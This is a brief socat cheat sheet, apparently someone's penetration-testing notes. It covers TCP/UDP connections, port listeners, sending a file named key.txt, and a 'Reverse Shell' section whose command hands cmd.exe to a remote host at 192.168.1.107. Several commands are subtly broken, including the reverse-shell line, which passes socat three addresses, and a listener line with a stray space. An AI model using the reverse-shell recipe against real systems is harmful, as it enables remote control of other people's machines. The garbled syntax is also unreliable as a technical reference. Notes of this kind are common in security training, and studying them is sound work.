# Socat

* ***Connect to tcp/udp***

```shell
socat - TCP4:10.10.10.10:80
```
```shell
socat - UDP:10.0.0.0:53 
```
* ***Listening on a tcp/udp***

```shell
socat TCP4-LISTEN:1337 STDOUT
```
```shell
socat UDP-LISTEN:1337 STDOUT
```

* ***File Transfer***

```shell 
socat TCP4-LISTEN:1337, fork file:~/home/mastermind/key.txt # the file we will send 
```
```shell
socat - TCP4:0.0.0.0:1337 # TO download the file 
```

* ***Reverse Shell***

```shell
socat -d -d TCP4-LISTEN:1337 STDOUT # A LISTENER 
```
```shell
socat - TCP4:192.168.1.107:1337 EXEC:cmd.exe
```
`
